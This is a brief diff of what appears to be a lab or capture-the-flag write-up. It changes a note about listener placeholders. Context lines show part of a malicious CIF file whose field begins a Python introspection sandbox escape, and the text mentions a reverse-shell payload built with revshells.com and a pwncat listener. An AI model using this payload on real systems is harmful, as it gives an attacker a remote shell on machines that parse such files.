@@ -68,7 +68,7 @@ _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1]
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ```
-**Note:** Please change the &lt;listener_ip&gt; and &lt;listener_port&gt; according to your environment.
+**Note:** Please change the listener_ip and listener_port according to your environment.
 The payload was made with the help of https://www.revshells.com/ .
 
 A listener was set on the attacking machine using `pwncat -nvl <listener_port>`.
